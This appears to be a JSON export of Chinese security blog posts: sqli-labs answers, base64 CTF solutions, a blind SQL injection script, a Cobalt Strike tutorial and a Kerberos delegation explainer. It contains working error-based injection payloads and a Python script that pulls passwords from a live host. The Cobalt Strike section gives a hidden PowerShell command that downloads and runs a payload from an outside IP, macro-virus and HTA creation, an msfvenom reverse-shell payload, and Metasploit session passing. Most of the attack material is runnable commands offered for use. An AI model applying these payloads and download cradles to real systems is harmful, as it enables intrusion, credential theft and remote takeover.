syntax error: '~5.5.40-log' 使用位运算符连接（| &amp;） 12mysql&gt; insert into users values (3,'name'&amp;updatexml(2,concat(0x7e,(version())),0) xor '','pass');ERROR 1105 (HY000): XPATH syntax error: '~5.5.40-log' 新式MySQL Injection in Update, Insert and Delete answer 1234567891011121314POST /sqli/Less-19/ HTTP/1.1Host: 192.168.3.7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 38Origin: http://192.168.3.7Connection: closeReferer: http://192.168.3.7/sqli/Less-19/' and updatexml(2,concat(0x7e,(database())),0) and 'Upgrade-Insecure-Requests: 1uname=admin&amp;passwd=admin&amp;submit=Submit Less-20首先要想登录成功，获取cookie后，再对cookie进行报错注入 1$sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\"; answer: 123456789GET /sqli/Less-20/index.php HTTP/1.1Host: 192.168.3.7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: uname=admin' and updatexml(1,concat(0x7e,(select database()),0x7e),1) #Upgrade-Insecure-Requests: 1 Less-21cookie注入 ，base64编码 ，’) 123$cookee = base64_decode($cookee); echo \"&lt;br&gt;&lt;/font&gt;\"; $sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\"; Less-22cookie注入，base64编码，” 1234$cookee = base64_decode($cookee);$cookee1 = '\"'. $cookee. '\"';echo \"&lt;br&gt;&lt;/font&gt;\";$sql=\"SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1\";","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"sql注入","slug":"sql注入","permalink":"https://blog.cfyqy.com/tags/sql%E6%B3%A8%E5%85%A5/"}],"author":"ye1s"},{"title":"base64编码解码","slug":"base64编码解码","date":"2020-04-06T14:00:00.000Z","updated":"2020-04-13T07:28:13.000Z","comments":true,"path":"article/e20d3576.html","link":"","permalink":"https://blog.cfyqy.com/article/e20d3576.html","excerpt":"base64是一种基于用64个可打印字符来表示二进制数据的表示方法。它通常用作存储、传输一些二进制数据编码方法。","text":"base64是一种基于用64个可打印字符来表示二进制数据的表示方法。它通常用作存储、传输一些二进制数据编码方法。 base64 编码原理: base64 取 3byte 的输入数据，放在 24bit 的缓冲区中，从高位往低位放置。不足 3byte 的，于缓冲区剩下bit 用0补足。然后，每次取出6个bit，按照其值选择ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/中的字符作为编码后的输出不断转换，直到输入数据全部转换完成。 如果剩下两个输入数据，则编码后的结果加上一个= ;如果剩下一个输入数据，则编码后的结果加上两个=。 编码后的字符串长度是原来的4/3。 base64编码详情可看:Base64算法原理 0x1 base64 编码12345678910111213141516171819202122232425262728293031323334353637&lt;?phpstatic $base=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";$specialchar=\"=\";function c_base64_encode($src)&#123; global $base,$specialchar; $slen=strlen($src); $smod=($slen%3); $snum=floor($slen/3); $desc=array(); for($i=0;$i&lt;$snum;$i++)&#123; $_arr=array_map('ord',str_split(substr($src,$i*3,3))); $_dec0=$_arr[0]&gt;&gt;2; $_dec1=(($_arr[0]&amp;3)&lt;&lt;4)|($_arr[1]&gt;&gt;4); $_dec2=(($_arr[1]&amp;0xF)&lt;&lt;2)|($_arr[2]&gt;&gt;6); $_dec3=$_arr[2]&amp;63; $desc=array_merge($desc,array($base[$_dec0],$base[$_dec1],$base[$_dec2],$base[$_dec3])); &#125; if($smod==0)&#123; return implode(\"\",$desc); &#125; $_arr=array_map('ord',str_split(substr($src,$snum*3,3))); $_dec0=$_arr[0]&gt;&gt;2; if(!isset($_arr[1]))&#123; $_dec1=(($_arr[0]&amp;3)&lt;&lt;4); $_dec2=$_dec3=$specialchar; &#125;else&#123; $_dec1=(($_arr[0]&amp;3)&lt;&lt;4)|($_arr[1]&gt;&gt;4); $_dec2=$base[($_arr[1]&amp;7)&lt;&lt;2]; $_dec3=$specialchar; &#125; $desc=array_merge($desc,array($base[$_dec0],$base[$_dec1],$_dec2,$_dec3)); return implode('',$desc);&#125;?&gt; 0x2 base64 解码12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?php static $base=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";$specialchar=\"=\";function indexOfBase($ch)&#123; global $base,$specialchar; if($ch==$specialchar)&#123; return $ch; &#125; return strpos($base,$ch);&#125;function c_base64_decode($desc)&#123; global $base,$specialchar; $slen=strlen($desc); $snum=$slen/4; $src=array(); for($i=0;$i&lt;$snum-1;$i++)&#123; $_arr=array_map('indexOfBase',str_split(substr($desc,$i*4,4))); $_src0=$_arr[0]&lt;&lt;2|$_arr[1]&gt;&gt;4; $_src1=$_arr[1]&lt;&lt;4|$_arr[2]&gt;&gt;2; $_src2=$_arr[2]&lt;&lt;6|$_arr[3]; $src=array_merge($src,array($_src0,$_src1,$_src2)); &#125; $_arr=array_map('indexOfBase',str_split(substr($desc,($snum-1)*4,4))); if(in_array($specialchar,$_arr))&#123; $_src0=$_arr[0]&lt;&lt;2|$_arr[1]&gt;&gt;4; if($_arr[2]==$specialchar)&#123; $src=array_merge($src,array($_src0)); return implode(\"\",array_map('chr',$src)); &#125;else&#123; $_src1=$_arr[1]&lt;&lt;4|$_arr[2]&gt;&gt;2; $src=array_merge($src,array($_src0,$_src1)); return implode(\"\",array_map('chr',$src)); &#125; &#125; $_src0=$_arr[0]&lt;&lt;2|$_arr[1]&gt;&gt;4; $_src1=$_arr[1]&lt;&lt;4|$_arr[2]&gt;&gt;2; $_src2=$_arr[2]&lt;&lt;6|$_arr[3]; $src=array_merge($src,array($_src0,$_src1,$_src2)); return implode(\"\",array_map('chr',$src));&#125;?&gt; 0x3 ctf 例题例题1 通过观察下面编码，可以知道只是替换了base64 的对应表，以及输入数据不足3byte，编码结果添加的特殊填充值=。只要解码时，只要修改base64对应表和特殊填充值。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phperror_reporting(0);require_once 'flag.php';if (isset($_GET['get_string'])) &#123; print_r(c_base64_encode($flag_base64_more)); echo \"&lt;br/&gt;\"; if ($_GET['get_string'] === $flag_base64_more) &#123; echo \"&lt;br/&gt;\", \"you are right\", \"&lt;br/&gt;\"; &#125;&#125;function c_base64_encode($src)&#123; static $base=\"1234567890-+!@#$%^&amp;*()_+QWERTYUIOP&#123;&#125;|qwertyuiopASDFGHJKL:zxcvbnm\"; $slen=strlen($src); $smod = ($slen%3); $snum = floor($slen/3); $desc = array(); for($i=0;$i&lt;$snum;$i++) &#123; $_arr = array_map('ord',str_split(substr($src,$i*3,3))); $_dec0= $_arr[0]&gt;&gt;2; $_dec1= (($_arr[0]&amp;3)&lt;&lt;4)|($_arr[1]&gt;&gt;4); $_dec2= (($_arr[1]&amp;0xF)&lt;&lt;2)|($_arr[2]&gt;&gt;6); $_dec3= $_arr[2]&amp;63; $desc = array_merge($desc,array($base[$_dec0],$base[$_dec1],$base[$_dec2],$base[$_dec3])); &#125; if($smod==0) return implode('',$desc); $_arr = array_map('ord',str_split(substr($src,$snum*3,3))); $_dec0= $_arr[0]&gt;&gt;2; if(!isset($_arr[1])) &#123; $_dec1= (($_arr[0]&amp;3)&lt;&lt;4); $_dec2=$_dec3=\"?\"; &#125; else &#123; $_dec1= (($_arr[0]&amp;3)&lt;&lt;4)|($_arr[1]&gt;&gt;4); $_dec2= $base[($_arr[1]&amp;7)&lt;&lt;2]; $_dec3=\"?\"; &#125; $desc = array_merge($desc,array($base[$_dec0],$base[$_dec1],$_dec2,$_dec3)); return implode('',$desc);&#125;highlight_file(__FILE__);?&gt; 例题2 题目链接http://111.230.11.183:44444/encode_encrypt_hash/base64/base64_harder.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phperror_reporting(0);require_once 'flag.php';if (isset($_GET['get_string'])) &#123; print_r(c_base64_encode($flag_base64_harder)); echo \"&lt;br/&gt;\"; if (isset($_GET['code'])) &#123; echo \"&lt;br/&gt;\", c_base64_encode($_GET['code']), \"&lt;br/&gt;\"; &#125; if (isset($_GET['flag'])) &#123; if ($_GET['flag'] === $flag_base64_harder) &#123; echo \"Good Luck!\"; &#125; &#125;&#125;function c_base64_encode($src)&#123; global $table_harder; $base = $table_harder; $slen=strlen($src); $smod = ($slen%3); $snum = floor($slen/3); $desc = array(); for($i=0;$i&lt;$snum;$i++) &#123; $_arr = array_map('ord',str_split(substr($src,$i*3,3))); $_dec0= $_arr[0]&gt;&gt;2; $_dec1= (($_arr[0]&amp;3)&lt;&lt;4)|($_arr[1]&gt;&gt;4); $_dec2= (($_arr[1]&amp;0xF)&lt;&lt;2)|($_arr[2]&gt;&gt;6); $_dec3= $_arr[2]&amp;63; $desc = array_merge($desc,array($base[$_dec0],$base[$_dec1],$base[$_dec2],$base[$_dec3])); &#125; if($smod==0) return implode('',$desc); $_arr = array_map('ord',str_split(substr($src,$snum*3,3))); $_dec0= $_arr[0]&gt;&gt;2; if(!isset($_arr[1])) &#123; $_dec1= (($_arr[0]&amp;3)&lt;&lt;4); $_dec2=$_dec3=\"?\"; &#125; else &#123; $_dec1= (($_arr[0]&amp;3)&lt;&lt;4)|($_arr[1]&gt;&gt;4); $_dec2= $base[($_arr[1]&amp;7)&lt;&lt;2]; $_dec3=\"?\"; &#125; $desc = array_merge($desc,array($base[$_dec0],$base[$_dec1],$_dec2,$_dec3)); return implode('',$desc);&#125;highlight_file(__FILE__);?&gt; 从源码中，我们不知道base64对应的转换表，但可以控制参数code参数，输入任意数据得到加密的结果，即知道明文和密文，猜解base64转换表。 详情可看此文章: 爆破非默认Base64编码表 此题的破解脚本如下: 123456789101112131415161718192021222324252627282930313233343536373839404142#coding:utf-8import requestsimport redicts=&#123;&#125;def getDesc(): global dicts base64table=\"\" url=\"http://111.230.11.183:44444/encode_encrypt_hash/base64/base64_harder.php?get_string=&amp;code=&#123;&#125;\" pattern=re.compile(r\"&lt;br/&gt;&lt;br/&gt;(.*?)&lt;br/&gt;\") for i in range(0x0,0x7f): for j in range(0x0,0x7f): for k in range(0x0,0x7f): payload=chr(i)+chr(j)+chr(k) current_url=url.format(payload) content=requests.get(current_url) desc=pattern.search(content.text).group(1) print(payload) base64Table(payload,desc) if len(dicts)==64: print(dicts) for i in range(64): base64table=base64table+dicts[i] print(base64table) exit(0)def base64Table(src,desc): global dicts src0=ord(src[0]) src1=ord(src[1]) src2=ord(src[2]) if '?' not in desc: desc0=src0&gt;&gt;2 desc1=((src0&amp;3)&lt;&lt;4 )|(src1&gt;&gt;4) desc2=((src1&amp;15)&lt;&lt;2 )|(src2&gt;&gt;6) desc3=src2&amp;63 dicts.update(&#123;desc0:desc[0]&#125;) dicts.update(&#123;desc1:desc[1]&#125;) dicts.update(&#123;desc2:desc[2]&#125;) dicts.update(&#123;desc3:desc[3]&#125;)getDesc() 参考文章: Base64算法原理 爆破非默认Base64编码表","categories":[{"name":"ctf","slug":"ctf","permalink":"https://blog.cfyqy.com/categories/ctf/"}],"tags":[{"name":"base64","slug":"base64","permalink":"https://blog.cfyqy.com/tags/base64/"}],"author":"ye1s"},{"title":"sql盲注效率之与运算","slug":"sql盲注效率之与运算","date":"2020-03-31T15:42:00.000Z","updated":"2020-04-13T07:28:26.000Z","comments":true,"path":"article/58ca2f6c.html","link":"","permalink":"https://blog.cfyqy.com/article/58ca2f6c.html","excerpt":"以往大部分 sql 盲注的爆破脚本大概都是通过遍历一串可打印字符来对比，猜解正确的字符值。昨天看到了一种通过与运算来猜解字符串的想法，每个字符值只要通过7次与运算，就能够确定，有点类似于二分法，对比单纯遍历的思想，效率显著提升。","text":"以往大部分 sql 盲注的爆破脚本大概都是通过遍历一串可打印字符来对比，猜解正确的字符值。昨天看到了一种通过与运算来猜解字符串的想法，每个字符值只要通过7次与运算，就能够确定，有点类似于二分法，对比单纯遍历的思想，效率显著提升。 详情可看此文章:让你的SQL盲注快起来 与运算猜解脚本如下: 1234567891011def compute_by_and(word): for ele in word: ele_b=get_character(ele) print \"Guess the value &#123;&#125;:&#123;&#125;\".format(ele_b,chr(ele_b))def get_character(char): char_b=ord(char) value=0 for i in range(7): if char_b &amp; (2**i): value=value+(2**i) return value 来一道ctf题练练手 链接:http://111.230.11.183:44444/basic_skills/sql/sql3.phppython sql盲注脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#coding:utf-8import requestsimport urlliburl=\"http://111.230.11.183:44444/basic_skills/sql/sql3.php\"table_payload=\"a' or 1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))&amp;&#123;2&#125; -- \"column_payload=\"a' or 1 and ascii(substr((select column_name from information_schema.columns where table_name='user' limit &#123;0&#125;,1),&#123;1&#125;,1))&amp;&#123;2&#125; -- +\"flag_payload= \"a' or 1 and ascii(substr((select password from user limit &#123;0&#125;,1),&#123;1&#125;,1))&amp;&#123;2&#125; -- \"#pyaload中mysql注释符--，后面记得要有空格headers=&#123;\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0\",\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\",\"Accept-Encoding\": \"gzip, deflate\",\"Content-Type\": \"application/x-www-form-urlencoded\",\"Origin\": \"http://111.230.11.183:44444\",\"Connection\": \"close\",\"Referer\": \"http://111.230.11.183:44444/basic_skills/sql/sql3.php\",\"Upgrade-Insecure-Requests\": \"1\"&#125;def get_information(): all_name=\"result:\"# 所有 for i in range(15): name=\"\"#单一 for j in range(1,33): value=0#ascii for k in range(7): #payload=table_payload.format(i,j,(2**k)) #payload=column_payload.format(i,j,(2**k)) payload=flag_payload.format(i,j,(2**k)) #payload=urllib.quote(payload) #print payload data=&#123; \"username\": payload, \"password\":\"sdf\" &#125; rep=requests.post(url=url,headers=headers,data=data,allow_redirects=False) if rep.status_code==302: value=value+(2**k) if value==0: #判断name的结尾 if name==\"\": print all_name return 1 all_name=all_name+\" \"+name break name=name+chr(value) print nameif __name__==\"__main__\": get_information() 参考文章: 让你的SQL盲注快起来","categories":[{"name":"ctf","slug":"ctf","permalink":"https://blog.cfyqy.com/categories/ctf/"}],"tags":[{"name":"sql盲注","slug":"sql盲注","permalink":"https://blog.cfyqy.com/tags/sql%E7%9B%B2%E6%B3%A8/"}],"author":"ye1s"},{"title":"CobaltStrike","slug":"CobaltStrike","date":"2020-02-08T15:07:25.000Z","updated":"2020-04-13T07:30:23.000Z","comments":true,"path":"article/45c442a2.html","link":"","permalink":"https://blog.cfyqy.com/article/45c442a2.html","excerpt":"Cobalt Strike 是一款不错的渗透测试工具，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket 代理，office 攻击，文件捆绑，钓鱼等多种功能 。","text":"Cobalt Strike 是一款不错的渗透测试工具，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket 代理，office 攻击，文件捆绑，钓鱼等多种功能 。 Cobalt_Strike全套教程视频 0x1CS安装Cobalt Strike3.8 工具下载 链接：https://pan.baidu.com/s/1Zi5HuncVhlNKdeu_zptDmQ提取码：7ckh Linux下启动 teamserver 1.&#x2F;teamserver 服务器外网ip 客户端连接密码 客户端连接点击cobalstrike.jar客户端，填写相应信息 0x2 listener一个“监听”就是一个等待连接被入侵的系统的服务器。 CS 的监视器 有两个作用， 是告诉 CS 去为任何一种建立攻击载荷处理器; 那儿有一个被命名的别名是给处理器和设置信息作为参考的 攻击载荷有三种类型: 操作系统 攻击载荷名称 传输器 例如: 1windows/beacon_http/reverse_http 是在 windows 操作系统下用 reverse_http 传输器 来进行 beacon_http 攻击载荷 stager(传输器) 是一个很小的代码,它连接并下载真实的 攻击载荷 并且插入内存 CS 有两种监视器: Beacon 为内置的 Listener，即在目标主机执行相应的payload，获取 shell 到 CS 上；其中包含DNS、HTTP、SMB。 Foreign为外部结合的 Listener，常用于 MSF 的结合，例如获取 meterpreter 到 MSF 上。 beacon 命令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990Command Description ------- ----------- browserpivot 注入受害者浏览器进程 bypassuac 绕过UAC cancel 取消正在进行的下载 cd 切换目录 checkin 强制让被控端回连一次 clear 清除beacon内部的任务队列 connect Connect to a Beacon peer over TCP covertvpn 部署Covert VPN客户端 cp 复制文件 dcsync 从DC中提取密码哈希 desktop 远程VNC dllinject 反射DLL注入进程 dllload 使用LoadLibrary将DLL加载到进程中 download 下载文件 downloads 列出正在进行的文件下载 drives 列出目标盘符 elevate 尝试提权 execute 在目标上执行程序(无输出) execute-assembly 在目标上内存中执行本地.NET程序 exit 退出beacon getprivs Enable system privileges on current token getsystem 尝试获取SYSTEM权限 getuid 获取用户ID hashdump 转储密码哈希值 help 帮助 inject 在特定进程中生成会话 jobkill 杀死一个后台任务 jobs 列出后台任务 kerberos_ccache_use 从ccache文件中导入票据应用于此会话 kerberos_ticket_purge 清除当前会话的票据 kerberos_ticket_use 从ticket文件中导入票据应用于此会话 keylogger 键盘记录 kill 结束进程 link Connect to a Beacon peer over a named pipe logonpasswords 使用mimikatz转储凭据和哈希值 ls 列出文件 make_token 创建令牌以传递凭据 mimikatz 运行mimikatz mkdir 创建一个目录 mode dns 使用DNS A作为通信通道(仅限DNS beacon) mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon) mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon) mode http 使用HTTP作为通信通道 mv 移动文件 net net命令 note 备注 portscan 进行端口扫描 powerpick 通过Unmanaged PowerShell执行命令 powershell 通过powershell.exe执行命令 powershell-import 导入powershell脚本 ppid Set parent PID for spawned post-ex jobs ps 显示进程列表 p**ec Use a service to spawn a session on a host p**ec_psh Use PowerShell to spawn a session on a host psinject 在特定进程中执行PowerShell命令 pth 使用Mimikatz进行传递哈希 pwd 当前目录位置 reg Query the registry rev2self 恢复原始令牌 rm 删除文件或文件夹 rportfwd 端口转发 run 在目标上执行程序(返回输出) runas 以另一个用户权限执行程序 runasadmin 在高权限下执行程序 runu Execute a program under another PID screenshot 屏幕截图 setenv 设置环境变量 shell cmd执行命令 shinject 将shellcode注入进程 shspawn 生成进程并将shellcode注入其中 sleep 设置睡眠延迟时间 socks 启动SOCKS4代理 socks stop 停止SOCKS4 spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into spawnu Spawn a session under another PID ssh 使用ssh连接远程主机 ssh-key 使用密钥连接远程主机 steal_token 从进程中窃取令牌 timestomp 将一个文件时间戳应用到另一个文件 unlink Disconnect from parent Beacon upload 上传文件 wdigest 使用mimikatz转储明文凭据 winrm 使用WinRM在主机上生成会话 wmi 使用WMI在主机上生成会话 argue 进程参数欺骗复制代码 beacon有三种类型: http beacon dns beacon smb beacon 0x2.1http beacon创建Beacon ListenerCobalt Strike-&gt;Listeners 创建 powershell 恶意代码Attacks-&gt;Web Drive-by-&gt;scripted web delivery复制里面的命令，并点击 ok在受害机上执行该命令 1powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://120.79.24.186/a'))\" 受害机成功上线 0x2.2 smb beaconSMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送。因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。 也经常利用 smb 提升权限。选择目标，点击Interact ，在beacon&gt;中输入 shell whoami/groups 查看当前权限，随后bypassuac smb ，成功后可看到产生一个新的 beacon 会话 ，yesi* 有带*号，表示为管理员。 ** DNS Beacon ** DNS Beacon在绕过防火墙 权限维持上非常有效 0x3.1 HTML ApplicationATTACK-&gt;packages-&gt; HTML Application 点击Generate,并保存evil.hta 将生成的evil.hta,上传到 CS 的服务器上点击 Launch复制 evil.hta 的 url 地址,并点击 ok让受害机访问 此 url 链接，并运行 evil.hta 文件 0x3.2 ms office macro首先我们需要制作一个word宏病毒来进行远控操作。在Cobalt strike中，需要新建一个监听程序来进行监听 然后点击attacks -&gt; packages -&gt; ms office macro， 选择前面所创建的listener 复制宏内容，然后打开一个word文档，添加宏，记得添加的地方不能有误，添加宏的位置在 视图 -&gt; 宏。创建宏以后添加代码是在project中，这点不能搞错，如下图添加完成以后，只需要保存为启用宏的word就可以了，这样就制作为一个word宏病毒文件 0x3.30x4 与Metasploit 结合CobalStrike 与 Metasploit 均是渗透利器，各有所长。前者更适合做稳控平台，后者则更擅长内网各类探测搜集与漏洞利用 0x4.1socks代理通过Beacon内置的socks功能在VPS上开启代理端口，打通目标内网通道，之后将本地Metasploit直接带入目标内网，进行横向渗透 首先，到已控目标机的Beacon下将socks代理开启。 1beacon&gt; socks 1024 开菜单栏中的View &gt; Proxy Pivots，点击Tunnel复制代理连接到Metasploit中在Metasploit设置 socks代理，探测目标内网中存在MS17_010漏洞的主机 12345678910111213msf5 &gt; setg Proxies socks4:120.79.24.186:1024 #让msf所有模块的流量都通过此代理走。(setg全局设置)Proxies =&gt; socks4:120.79.24.186:1024msf5 &gt; setg ReverseAllowProxy true #允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)ReverseAllowProxy =&gt; truemsf5 &gt; use auxiliary/scanner/smb/smb_ms17_010msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.3.0/24rhosts =&gt; 192.168.3.0/24msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set threads 100 threads =&gt; 100msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run[*] 192.168.3.0/24:445 - Scanned 71 of 256 hosts (27% complete)[+] 192.168.3.3:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit) 0x4.2CS与MSF会话互传** 0x4.2.1CobaltStrike派生Metasploit ** 当CobaltStrike获得了一个上线机器，想把这个目标传给Metasploit中的meterpreter，获得一个session进行控制。在Metasploit执行以下命令 12345678910msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.3.129lhost =&gt; 192.168.3.129setmsf5 exploit(multi/handler) &gt; set lport 5555lport =&gt; 5555msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 192.168.3.129:5555 之后使用CobaltStrike创建一个windows/foreign/reverse_tcp的Listener。其中IP为Metasploit的监听地址，端口为Metasploit所监听的端口然后选中计算机，右键-&gt;Spawn：选择MSF的监听器 一开始没有成功 123[*] Meterpreter session 1 opened (192.168.3.129:5555 -&gt; 192.168.3.3:50112) at 2020-02-08 09:56:43 -0500[*] 192.168.3.3 - Meterpreter session 8 closed. Reason: Died 尝试将受害者的防火墙关闭 ** 0x4.2.2 Metasploit派生CobaltStrike ** Metasploit设置监听msfvenom 生成payload 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.129 LPORT=5555 -f exe &gt; shell.exe 将生成的shell.exe，让受害机点击运行, msf成功得到一个session在CobaltStrike中创建一个监听者，和上一步类似，这里host需要修改为CobaltStrike的IP，创建好之后便监听4444端口，等待着被控机连接 12345678910111213141516171819meterpreter &gt; background [*] Backgrounding session 6...msf5 exploit(multi/handler) &gt; use exploit/windows/local/payload_inject msf5 exploit(windows/local/payload_inject) &gt; set payload windows/meterpreter/reverse_httppayload =&gt; windows/meterpreter/reverse_httpmsf5 exploit(windows/local/payload_inject) &gt; set lhost 120.79.24.186lhost =&gt; 120.79.24.186msf5 exploit(windows/local/payload_inject) &gt; set lport 4444lport =&gt; 4444msf5 exploit(windows/local/payload_inject) &gt; set DisablePayloadHandler true DisablePayloadHandler =&gt; truemsf5 exploit(windows/local/payload_inject) &gt; set session 6session =&gt; 6msf5 exploit(windows/local/payload_inject) &gt; run[*] Running module against YESI-PC[-] PID does not actually exist.[*] Launching notepad.exe...[*] Preparing 'windows/meterpreter/reverse_http' for PID 2860 这里倒是没有成功，暂留，日后补充。 参考文章: CobaltStrike与Metasploit实战联动利用Cobalt strike一步步教你发送钓鱼邮件","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透工具","slug":"渗透工具","permalink":"https://blog.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"},{"name":"cobaltstrike","slug":"cobaltstrike","permalink":"https://blog.cfyqy.com/tags/cobaltstrike/"}],"author":"ye1s"},{"title":"域渗透之委托","slug":"渗透之委托-1","date":"2020-02-06T09:32:00.000Z","updated":"2020-04-13T07:31:07.000Z","comments":true,"path":"article/5778d21f.html","link":"","permalink":"https://blog.cfyqy.com/article/5778d21f.html","excerpt":"域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。","text":"域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。 委派基本配置服务账号和主机账号都可以开启委派功能。 主机账号，与域主机绑定的账户， 服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。 下图为主机账户委派配置 下图为服务账号的委派配置 可以看到主机账户和服务账户在委派功能上没什么区别，都存在三个选项 信任此用户作为委派 =&gt; 不开启委派功能 信任此用户作为任何服务的委派 =&gt; 非受限委派 仅信任此用户作为指定服务的委派 =&gt; 受限委派 适用任何身份验证协议 =&gt; s4u2self + s4u2proxy协议参与 仅适用Kerberos =&gt; s4u2proxy协议参与 非约束委派非约束委派在Kerberos中实现时，User会将从KDC处得到的TGT发送给访问的service1（可以是任意服务），service1拿到TGT之后可以通过TGT访问域内任意其他服务，所以被称为非约束委派。 认证流程： 用户 通过发送KRB_AS_REQ消息（身份验证服务（AS）交换中的请求消息）来向密钥分发中心（KDC）进行身份验证，并请求可转发的 TGT。 KDC在KRB_AS_REP消息（身份验证服务（AS）交换中的响应消息）中返回可转发TGT。 用户根据来自步骤2的可转发TGT请求转发的TGT。这是通过KRB_TGS_REQ消息完成的。 KDC在KRB_TGS_REP消息中为用户返回转发的TGT。 用户使用步骤2中返回的TGT向Service1 请求服务票证。这是通过KRB_TGS_REQ消息完成的。 该票证授予服务（TGS）返回一个KRB_TGS_REP服务票证。 用户通过发送KRB_AP_REQ消息，显示服务票证，转发的TGT和转发的TGT的会话密钥，向Service1发出请求。注意：KRB_AP_REQ消息是身份验证协议（AP）交换中的请求消息。 为了满足用户的请求，Service1需要Service2代表用户执行某些操作。Service1使用用户的转发的TGT并将其在KRB_TGS_REQ中发送到KDC，以用户的名义请求Service2 的票证。 KDC在KRB_TGS_REP消息中将Service2的票证返回给Service1，以及Service1可以使用的会话密钥。该票证将客户端标识为用户，而不是 Service1。 Service1由充当用户的KRB_AP_REQ向Service2发出请求。 Service2响应。 通过该响应，Service1现在可以在步骤7中响应用户的请求。 如此处所述，TGT转发委派机制不限制Service1对转发的TGT的使用。Service1可以用用户名向KDC索要其他服务的票证 。 KDC将退还所请求的票证。 然后，Service1可以继续用ServiceN来模拟用户。例如，如果Service1被破坏，则可能构成风险。Service1可以继续伪装成其他服务的合法用户。 ServiceN将响应Service1，就像它是用户的进程一样。 非约束委派的配置: 约束委派微软很早就意识到非约束委派并不是特别安全，在 Windows 2003上发布了”约束”委派。 其中包括一组 Kerberos 协议扩展，就是本文之前提到的两个扩展 S4U2Self 和 S4U2Proxy。配置它后，约束委派将限制指定服务器可以代表用户执行的服务。这需要域管理员特权(其实严谨一点是SeEnableDelegation特权，该特权很敏感，通常仅授予域管理员)才能为服务配置域帐户，并且将帐户限制为单个域。 认证流程: 用户的机器向Service1发出请求。用户已通过身份验证，但Service1没有用户的授权数据。通常，这是由于身份验证是通过Kerberos以外的其他方式执行的。 已经通过KDC进行身份验证并获得其TGT的Service1通过S4U2self扩展名代表指定的用户向其请求服务票证。通过 S4U2self数据中的用户名和用户领域名称来标识用户（如第2.2.1节中所述）。或者，如果服务1拥有用户的证书，则可以使用证书通过PA-S4U-X509-USER 结构向KDC识别用户。 KDC会返回发给Service1的服务票证，就好像是用户通过用户自己的TGT请求该票证一样。服务票证可能包含用户的授权数据。 Service1可以使用服务票证中的授权数据来满足用户的请求。然后该服务响应用户。 尽管S4U2self向Service1提供有关用户的信息，但此扩展不允许服务1代表用户发出其他服务的请求。那就是S4U2proxy的作用。S4U2proxy在上图的下半部分描述。 